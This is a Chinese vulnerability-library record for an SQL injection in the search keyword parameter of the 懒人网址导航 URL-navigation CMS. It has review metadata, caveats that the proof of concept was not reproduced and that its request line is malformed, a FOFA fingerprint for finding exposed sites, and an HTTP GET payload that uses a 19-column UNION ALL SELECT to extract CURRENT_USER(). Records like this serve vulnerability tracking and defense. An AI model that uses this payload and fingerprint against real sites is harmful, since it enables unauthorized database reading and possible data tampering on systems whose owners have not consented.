---
source: "wy876 漏洞文库"
title: "懒人网址导航 search keyword SQL注入"
product: "懒人网址导航"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL固定UNION列数，版本未知"
prerequisites: "无Cookie请求"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nugh9v1qorh6l3wt"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%87%92%E4%BA%BA%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA/%E6%87%92%E4%BA%BA%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9Fsearch%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "./templates/antidote/css/style.css"
id: "vw-472d87c8839b70c0f49449be"
entity_id: "ve-472d87c8839b70c0f49449be"
schema_version: "1"
---

# 懒人网址导航 search keyword SQL注入

## 条目说明

- 对象与具体问题：懒人网址导航；search keyword SQL注入
- 版本、配置及部署条件：MySQL固定UNION列数，版本未知
- 认证与权限前提：无Cookie请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- GET request-target直接包含空格，原始HTTP请求行会被错误分隔，需编码展示而非可直接发送
- FOFA字符串缺闭合引号，搜索语句损坏
- 只有CURRENT_USER联合查询，无实际返回/源码/修复，修改删除数据库属条件后果
- 补发行方和版本，导航CMS分类更适合

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
懒人网址导航系统是一种智能化的网址导航平台，旨在帮助用户快速找到所需的网址和资源。该系统提供了以下功能和特点：该系统提供了智能化的网址搜索和推荐功能，能够根据用户的搜索习惯和偏好推荐相关的网址和资源。同时，系统还提供了网址分类、网址收藏和网址分享等功能，方便用户管理和共享网址。懒人网址导航系统存在SQL search接口处存在注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。 

## 二、影响版本
+ 懒人网址导航系统

## 三、资产测绘
+ fofa`"./templates/antidote/css/style.css`


## 四、漏洞复现
```plain
GET /search.php?keyword=' UNION ALL SELECT CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Bypass HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nugh9v1qorh6l3wt>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
